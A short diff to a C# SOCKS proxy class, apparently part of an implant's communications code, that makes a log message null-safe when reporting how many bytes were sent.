@@ -183,7 +183,8 @@ namespace SocksProxy.Classes.Socks
                             if (timeoutCtr > 5)
                             {
 								//Nothing is being read from the server quick check to see if the client has anything
-								ImplantComms.LogMessage($" Nothing received after sending {sent.Count} bytes");
+								
+								ImplantComms.LogMessage($" Nothing received after sending {sent?.Count ?? 0 } bytes");
 
 								toSend = CmdCommshandler.Send(targetId, "nochange", null, out connectionDead);
                                 if (null == toSend || connectionDead) //Cant't have worked just bail here connection no doubt has been closed
